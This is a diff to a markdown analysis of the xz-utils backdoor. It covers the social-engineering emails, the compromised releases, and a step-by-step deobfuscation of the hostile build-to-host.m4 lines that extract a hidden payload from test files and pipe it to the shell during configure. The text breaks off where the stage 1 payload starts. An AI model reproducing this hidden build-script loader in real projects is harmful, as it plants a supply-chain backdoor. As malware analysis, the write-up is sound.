@@ -8,11 +8,11 @@ We can only speculate why xz-utils was targeted by this actor(s), but it does se
 # Social Engineering
 Jia Tan is evil but has aura 
 Pressure emails:
-https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html
-https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.html
-https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.html
+- https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html
+- https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.html
+- https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.html
 The Concession:
-https://www.mail-archive.com/xz-devel@tukaani.org/msg00571.html
+- https://www.mail-archive.com/xz-devel@tukaani.org/msg00571.html
 
 # The Git History and Release
 Jia Tan created two releases of xz-utils thrat were compromised. There is 5.6.0 and 5.6.1 which contains some additional extensibility to the backdoor. You will not be able to find this release in the releases tab, but it can be found by enumerating the URL. This shows Github’s auto-packaged release which is NOT what we are looking for.
@@ -28,35 +28,40 @@ Let’s compare the old build-to-host.m4 in 5.4.7 with the Jia Tan’s in 5.6.1:
 ![build to host](./imgs/build-to-host.png)
 
 I will start by extracting two important variables/patterns that we will see often:
+
 ```bash
 gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
 gl_path_map='tr "\t \-_" " \t_\-"'
 ```
 
-gl_am_configmake greps the source directory for any binary that matches 4 hashtags followed by 5 alphanumeric characters and then another 5 dashes. Running this command from the project directory with srcdir set to ‘./’ yields ‘tests/files/bad-3-corrupt_lzma2.xz’. This is one of the binary test files that Jia Tan added. 
+`gl_am_configmake` greps the source directory for any binary that matches 4 hashtags followed by 5 alphanumeric characters and then another 5 dashes. Running this command from the project directory with srcdir set to ‘./’ yields ‘tests/files/bad-3-corrupt_lzma2.xz’. This is one of the binary test files that Jia Tan added. 
 
 ![xxd of the test file Jia Tan added](./imgs/xdd.png)
 
-Then there is the gl_path_map which just replaces tabs with spaces, spaces with tabs, underscores with dashes, and dashes with underscores. These variables are then used in long chains of commands to obfuscate what is happening. 
+Then there is the `gl_path_map` which just replaces tabs with spaces, spaces with tabs, underscores with dashes, and dashes with underscores. These variables are then used in long chains of commands to obfuscate what is happening. 
 
 Let’s take a dive at the first of these commands which is then used in another chain:
+
 ```bash
 gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
 ```
 
-This command pipes ‘tests/files/bad-3-corrupt_lzma2.xz’ to sed which just strips the filename until it encounters the last ‘.’. This results in gl_[$1]_prefix=xz.
+This command pipes ‘tests/files/bad-3-corrupt_lzma2.xz’ to sed which just strips the filename until it encounters the last ‘.’. This results in `gl_[$1]_prefix=xz`.
 
-Now that we understand gl_[$1]_prefix, we can understand gl_[$1]_config:
+Now that we understand `gl_[$1]_prefix`, we can understand `gl_[$1]_config`:
+
 ```bash
 gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
 ```
 
 This starts with some edits to the bad test file, then it swaps all the spaces, tabs, etc in the binary and finally it decompresses that output and suppresses any errors. Looking at it deobfuscated it sure does seem scary!
+
 ```bash
 gl_[$1]_config='sed "r\n" tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d 2>/dev/null'
 ```
 
 The final step of build-to-host.m4 is configuring AC_CONFIG_COMMANDS which executes at the very end of configure. This is what ultimately extracts and executes the stage 1 bash payload. 
+
 ```bash
 # Combined command
 AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null],[gl_config_gt="eval \$gl_[$1]_config"])
@@ -67,7 +72,9 @@ eval $gl_config_gt | $SHELL 2>/dev/null
 ```
 
 # Stage 1 Bash Payload
-The stage 1 bash payload is the contents of gl_[$1]_config. I obtained the bash by running the command in a vm and echoing what ended up in the variable. This script is primarily just setting up for the second stage by decompressing the other test file that Jia Tan added. There is a series of head calls that extract pieces of tests/files/good-large_compressed.lzma. Then we do another substitution but this time of bytes. Then we perform another decompression and pipe the result, the second stage bash payload, to bash. 
+
+The stage 1 bash payload is the contents of `gl_[$1]_config`. I obtained the bash by running the command in a vm and echoing what ended up in the variable. This script is primarily just setting up for the second stage by decompressing the other test file that Jia Tan added. There is a series of head calls that extract pieces of tests/files/good-large_compressed.lzma. Then we do another substitution but this time of bytes. Then we perform another decompression and pipe the result, the second stage bash payload, to bash. 
+
 ```bash
 ####Hello####
 #U$
